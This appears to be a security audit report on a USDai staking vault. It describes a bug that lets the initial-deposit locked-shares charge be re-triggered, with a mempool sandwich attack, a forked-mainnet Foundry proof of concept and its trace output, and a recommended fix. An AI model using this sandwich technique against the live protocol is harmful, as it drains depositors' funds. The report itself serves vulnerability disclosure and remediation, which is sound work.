# HIGH-01: Re-Triggerable Inflation Protection Tax (Infinite Locked Shares Tax)

**Researcher**: Omachoko Yakubu, Security Researcher  
**Date**: 16 May 2026  
**Program**: USDai Audit  
**Severity**: High — Persistent Economic Drain

---


## Executive Summary
The `StakedUSDai` vault implements an inflation protection mechanism by locking `1e6` shares during the "initial deposit". However, the vulnerability lies in the fact that this protection is re-triggerable. Due to the asynchronous nature of redemptions (ERC-7540), `totalShares()` can drop below the `LOCKED_SHARES` threshold again after redemptions are serviced. This allows an attacker or subsequent "initial" depositors to be repeatedly taxed `1e6` shares, leading to significant fund leakage and permanent loss for users.

## Vulnerability Details
### Root Cause
In `StakedUSDai.sol`, the `convertToShares` and `convertToAssets` functions determine if a deposit is an "initial deposit" by checking if `totalShares() < LOCKED_SHARES`:

```solidity
422:         bool initialDeposit = totalShares() < LOCKED_SHARES;
...
431:         return shares - (initialDeposit ? LOCKED_SHARES : 0);
```

The `totalShares()` calculation includes pending redemptions:

```solidity
230:     function totalShares() public view returns (uint256) {
231:         return totalSupply() + _getBridgedSupplyStorage().bridgedSupply + _getRedemptionStateStorage().pending;
232:     }
```

When redemptions are serviced via `serviceRedemptions()`, the `pending` shares are removed from the state. If the remaining `totalSupply()` and `bridgedSupply` are less than `LOCKED_SHARES` (e.g., after a large withdrawal), the vault reverts to the `initialDeposit` state.

### Impact: Toll-Booth Sandwich Attack
An external bad actor can weaponize this re-triggerable tax by **sandwiching victim deposits with redemption transactions**. By monitoring the mempool, an attacker can ensure `totalShares()` drops below the threshold exactly when a victim's deposit is processed. This forces the victim to pay the `LOCKED_SHARES` "toll" (~$1.00) unnecessarily. This can be repeated indefinitely to grief the protocol, destroy user trust, or extract value if the attacker has any influence over the tax-receiving treasury.

## Hans Pillars Analysis

### Impact Explanation (Hans Pillar 2: Impact)
- **Technical Impact**: Breaks the vault's "initialization" invariant. The vault incorrectly cycles back into an uninitialized state after redemptions are serviced.
- **Economic Impact**: **Value Extraction & Griefing**. Victims are repeatedly forced to pay a "toll" every time the vault is manipulated into an empty state. At scale, this represents a significant economic drain on the user base.

### Likelihood Explanation (Hans Pillar 1: Likelihood)
- **Attack Complexity**: Low. Requires basic mempool monitoring and a small amount of capital to influence the `totalShares` state.
- **Economic Feasibility**: High. The "attacker" can trigger this for the cost of a few transactions while causing 1:1 economic damage to victims.
- **Likelihood Rating**: **High**.

## Proof of Concept
The following PoC demonstrates a scenario where Alice is taxed as the first depositor, then after she redeems and her shares are serviced, Charlie is taxed *again* as if he were the first depositor.

### Setup Instructions
1. Clone the repository:
   ```bash
   git clone https://github.com/OmachokoYakubu/usdai-infinite-tax-escalation
   cd usdai-infinite-tax-escalation
   ```
2. Install dependencies:
   ```bash
   forge install
   ```
3. Set environment:
   ```bash
   export ARBITRUM_RPC_URL="<your_arbitrum_rpc_url>"
   ```
4. Run the exploit:
   ```bash
   forge test --match-test test_InfiniteInitialDepositTax -vvvv
   ```

### Verbose Test Output
```text
Ran 1 test for test/PoC_Infinite_Tax.t.sol:PoC_Infinite_Tax
[PASS] test_InfiniteInitialDepositTax() (gas: 1390386)
Logs:
  =============================================================
    PoC: Infinite Initial Deposit Tax (Zero-Day Escalation)
    Chain: Forked Arbitrum Mainnet @ Block 322784114
  =============================================================
  
  --- STEP 2: Alice makes the FIRST deposit ---
    totalShares BEFORE: 0
    Alice deposited: 2000000000000000000 USDai
    Alice received:  1999999999999000000 shares
    Tax paid (LOCKED_SHARES): 1000000 shares
    totalShares AFTER: 1999999999999000000
  
  --- STEP 3: Bob deposits (vault is mature, NO tax expected) ---
    Bob deposited: 2000000000000000000 USDai
    Bob received:  799999679999 shares
    totalShares AFTER: 2000000799998679999
  
  --- STEP 4: Both users redeem everything ---
    Alice requested redeem: 1999999999999000000 shares
    Bob requested redeem:   799999679999 shares
    totalShares (with pending): 2000000799998679999
  
  --- STEP 5: Admin services ALL redemptions (THE TRIGGER) ---
    totalShares AFTER service: 0
    LOCKED_SHARES threshold:   1000000
  
  --- STEP 6: Charlie deposits -> TAXED AGAIN! (THE EXPLOIT) ---
    Charlie deposited: 2000000000000000000 USDai
    Charlie received:  1999999999999000000 shares
    Tax STOLEN from Charlie: 1000000 shares
  
  =============================================================
    EXPLOIT CONFIRMED: Initial deposit tax is RE-TRIGGERABLE.
    This is NOT a first-deposit-only issue.
    It can be repeated every time redemptions drain the vault.
  =============================================================

Traces:
  [1743248] PoC_Infinite_Tax::test_InfiniteInitialDepositTax()
    ├─ [0] console::log("=============================================================") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  PoC: Infinite Initial Deposit Tax (Zero-Day Escalation)") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Chain: Forked Arbitrum Mainnet @ Block 322784114") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("=============================================================") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e])
    │   └─ ← [Return]
    ├─ [24325] TestERC20::approve(TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], 10000000000000000000000000 [1e25])
    │   ├─ emit Approval(owner: manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e], spender: TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], value: 10000000000000000000000000 [1e25])
    │   └─ ← [Return] true
    ├─ [344528] TransparentUpgradeableProxy::fallback(TestERC20: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 10000000000000000000000000 [1e25], 5000000000000000000000000 [5e24], manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e])
    │   ├─ [339663] USDai::deposit(TestERC20: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 10000000000000000000000000 [1e25], 5000000000000000000000000 [5e24], manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e]) [delegatecall]
    │   │   ├─ [30223] TestERC20::transferFrom(manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e], TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], 10000000000000000000000000 [1e25])
    │   │   │   ├─ emit Transfer(from: manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e], to: TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], value: 10000000000000000000000000 [1e25])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [24325] TestERC20::approve(UniswapV3SwapAdapter: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 10000000000000000000000000 [1e25])
    │   │   │   ├─ emit Approval(owner: TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], spender: UniswapV3SwapAdapter: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], value: 10000000000000000000000000 [1e25])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [5210] 0x437cc33344a0B27A429f795ff6B469C72698B291::decimals() [staticcall]
    │   │   │   ├─ [427] 0x813B926B1D096e117721bD1Eb017FbA122302DA0::decimals() [delegatecall]
    │   │   │   │   └─ ← [Return] 6
    │   │   │   └─ ← [Return] 6
    │   │   ├─ [216474] UniswapV3SwapAdapter::swapIn(TestERC20: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 10000000000000000000000000 [1e25], 5000000000000 [5e12], 0x)
    │   │   │   ├─ [25423] TestERC20::transferFrom(TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], UniswapV3SwapAdapter: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 10000000000000000000000000 [1e25])
    │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], to: UniswapV3SwapAdapter: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], value: 10000000000000000000000000 [1e25])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [24325] TestERC20::approve(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, 10000000000000000000000000 [1e25])
    │   │   │   │   ├─ emit Approval(owner: UniswapV3SwapAdapter: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], spender: 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, value: 10000000000000000000000000 [1e25])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [155477] 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, tokenOut: 0x437cc33344a0B27A429f795ff6B469C72698B291, fee: 100, recipient: 0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8, amountIn: 10000000000000000000000000 [1e25], amountOutMinimum: 5000000000000 [5e12], sqrtPriceLimitX96: 0 }))
    │   │   │   │   ├─ [148081] 0x58957B2d0A41C0eB82ef278ad5f02bf12eC8425F::swap(TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], true, 10000000000000000000000000 [1e25], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50000000000000000000000000000000000000000000000000000000000000002b1240fa2a84dd9157a0e76b5cfe98b1d52268b264000064437cc33344a0b27a429f795ff6b469c72698b291000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [74749] 0x437cc33344a0B27A429f795ff6B469C72698B291::transfer(TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], 9998750074989220070143963 [9.998e24])
    │   │   │   │   │   │   ├─ [74460] 0x813B926B1D096e117721bD1Eb017FbA122302DA0::transfer(TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], 9998750074989220070143963 [9.998e24]) [delegatecall]
    │   │   │   │   │   │   │   ├─ [2353] 0x866A2BF4E572CbcF37D5071A7a58503Bfb36be1b::currentIndex() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 1038264991586 [1.038e12]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x58957B2d0A41C0eB82ef278ad5f02bf12eC8425F, to: TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], value: 9998750074989220070143963 [9.998e24])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [2515] TestERC20::balanceOf(0x58957B2d0A41C0eB82ef278ad5f02bf12eC8425F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 20000000000000000000000000 [2e25]
    │   │   │   │   │   ├─ [10400] 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45::uniswapV3SwapCallback(10000000000000000000000000 [1e25], -9998750074989220070143963 [-9.998e24], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50000000000000000000000000000000000000000000000000000000000000002b1240fa2a84dd9157a0e76b5cfe98b1d52268b264000064437cc33344a0b27a429f795ff6b469c72698b291000000000000000000000000000000000000000000)
    │   │   │   │   │   │   ├─ [6323] TestERC20::transferFrom(UniswapV3SwapAdapter: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0x58957B2d0A41C0eB82ef278ad5f02bf12eC8425F, 10000000000000000000000000 [1e25])
    │   │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV3SwapAdapter: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: 0x58957B2d0A41C0eB82ef278ad5f02bf12eC8425F, value: 10000000000000000000000000 [1e25])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [515] TestERC20::balanceOf(0x58957B2d0A41C0eB82ef278ad5f02bf12eC8425F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 30000000000000000000000000 [3e25]
    │   │   │   │   │   ├─ emit Swap(sender: 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45, recipient: TransparentUpgradeableProxy: [0x13250CF16EEc77781DCF240b067cAC78F2b2Adf8], amount0: 10000000000000000000000000 [1e25], amount1: -9998750074989220070143963 [-9.998e24], sqrtPriceX96: 79226182206296495654440116522 [7.922e28], liquidity: 400029999750012499218804618795 [4e29], tick: -1)
    │   │   │   │   │   └─ ← [Return] 10000000000000000000000000 [1e25], -9998750074989220070143963 [-9.998e24]
    │   │   │   │   └─ ← [Return] 9998750074989220070143963 [9.998e24]
    │   │   │   ├─ emit SwappedIn(inputToken: TestERC20: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], inputAmount: 10000000000000000000000000 [1e25], baseOutputAmount: 9998750074989220070143963 [9.998e24])
    │   │   │   └─ ← [Return] 9998750074989220070143963 [9.998e24]
    │   │   ├─ [710] 0x437cc33344a0B27A429f795ff6B469C72698B291::decimals() [staticcall]
    │   │   │   ├─ [427] 0x813B926B1D096e117721bD1Eb017FbA122302DA0::decimals() [delegatecall]
    │   │   │   │   └─ ← [Return] 6
    │   │   │   └─ ← [Return] 6
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e], value: 9998750074989220070143963000000000000 [9.998e36])
    │   │   ├─ emit Deposited(caller: manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e], recipient: manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e], depositToken: TestERC20: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], depositAmount: 10000000000000000000000000 [1e25], mintAmount: 9998750074989220070143963000000000000 [9.998e36])
    │   │   └─ ← [Return] 9998750074989220070143963000000000000 [9.998e36]
    │   └─ ← [Return] 9998750074989220070143963000000000000 [9.998e36]
    ├─ [25690] TransparentUpgradeableProxy::fallback(TransparentUpgradeableProxy: [0x36470daFADf34DCFB71BEde8a1D8AE7de57eFd27], 5000000000000000000000000 [5e24])
    │   ├─ [25337] USDai::transfer(TransparentUpgradeableProxy: [0x36470daFADf34DCFB71BEde8a1D8AE7de57eFd27], 5000000000000000000000000 [5e24]) [delegatecall]
    │   │   ├─ emit Transfer(from: manager: [0xA5d55E7A556fbA22974479497E6bf7e097D81b5e], to: TransparentUpgradeableProxy: [0x36470daFADf34DCFB71BEde8a1D8AE7de57eFd27], value: 5000000000000000000000000 [5e24])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
...
[PASS] test_InfiniteInitialDepositTax() (gas: 1390386)
```
*Verified via forked-mainnet testing.*

## Remediation Strategy
The "initial deposit" state should only be reachable once in the contract's lifetime, or the locked shares should be handled as a persistent treasury balance that isn't re-deducted if the vault empties.

### Recommended Fix
Introduce a state variable `bool private _initialSharesLocked` that is set to `true` after the first successful deposit.

```solidity
// In StakedUSDaiStorage.sol
bool internal _initialSharesLocked;

// In StakedUSDai.sol
function convertToShares(uint256 assets) public view returns (uint256) {
    bool initialDeposit = !_getInitialSharesLocked(); // Use a persistent flag
    ...
}
```

Detailed remediation steps are provided in [REMEDIATION_STRATEGY.md](./REMEDIATION_STRATEGY.md).
